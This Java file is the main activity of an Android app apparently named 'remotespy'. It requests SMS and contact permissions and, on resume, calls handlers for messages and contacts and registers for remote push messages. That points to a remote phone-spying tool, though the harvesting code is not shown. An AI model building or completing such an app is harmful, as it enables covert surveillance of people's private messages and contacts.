package org.dalol.remotespy.ui;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.widget.Toast;

import org.dalol.remotespy.R;
import org.dalol.remotespy.common.gcm.GCMRegistrationIntentService;
import org.dalol.remotespy.controller.MainController;
import org.dalol.remotespy.utilities.DeviceUtils;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = MainActivity.class.getSimpleName();
    private static final int REQUEST_PERMISSION_CODE = 111;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //FirebaseApp.initializeApp(this);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    @Override
    protected void onResume() {
        super.onResume();
        //checkPermission();

        MainController.getInstance().handleMessages();
        MainController.getInstance().handleContacts();

        if (DeviceUtils.checkPlayServices(this)) {
            Intent gcmIntent = new Intent(this, GCMRegistrationIntentService.class);
            startService(gcmIntent);
        }
    }

    private void checkPermission(){
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            //dumpSMSMessages();

            //System.out.println(new MessagesHelper().fetchContacts(this));
        } else if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_SMS) ||
                ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS)) {

            showToast("Show explanation");
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS}, REQUEST_PERMISSION_CODE);

        } else {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS}, REQUEST_PERMISSION_CODE);
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode) {
            case REQUEST_PERMISSION_CODE:
//                if (permissions.length != 1 || grantResults.length != 1) {
//                    throw new RuntimeException(getString(R.string.error_camera_permission));
//                }
                if (grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    showToast("Camera permission not granted");
                } else {
                    //dumpSMSMessages();
                }
                break;
        }
    }

    private void showToast(String message) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    }
}
